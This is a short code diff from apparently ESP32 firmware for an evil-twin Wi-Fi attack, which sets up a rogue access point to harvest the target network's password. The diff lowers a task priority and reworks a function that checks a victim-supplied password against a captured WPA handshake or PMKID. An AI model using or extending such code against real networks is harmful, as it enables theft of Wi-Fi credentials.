@@ -81,7 +81,7 @@ void evil_twin_start_attack(target_info_t *targe_info)
     }
 
     memcpy(&target, targe_info, sizeof(target_info_t));
-    xTaskCreate(evil_twin_task, "evil_twin_task", 4096, NULL, 5, &evil_twin_task_handle);
+    xTaskCreate(evil_twin_task, "evil_twin_task", 4096, NULL, 3, &evil_twin_task_handle);
 
     ESP_LOGI(TAG, "Evil-Twin attack started.");
     ESP_LOGI(TAG, "TARGET: %s on Channel %d.", target.ssid, target.channel);
@@ -126,19 +126,16 @@ bool evil_twin_check_password(char *password)
 {
     handshake_info_t *handshake = wifi_attack_engine_handshake();
 
-    bool handshake_test = false;
-    bool pmkid_test = false;
-
-    if( handshake->pmkid_captured)
-    {
-        pmkid_test = verify_pmkid(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->pmkid);
-    }
     if( handshake->handshake_captured)
     {
-        handshake_test = verify_password(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->anonce, handshake->snonce, handshake->eapol, handshake->eapol_len, handshake->mic, handshake->key_decriptor_version);
+        return verify_password(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->anonce, handshake->snonce, handshake->eapol, handshake->eapol_len, handshake->mic, handshake->key_decriptor_version);
+    }
+    if( handshake->pmkid_captured)
+    {
+        return verify_pmkid(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->pmkid);
     }
     
-    return (handshake_test || pmkid_test);
+    return false;
 }
 
 
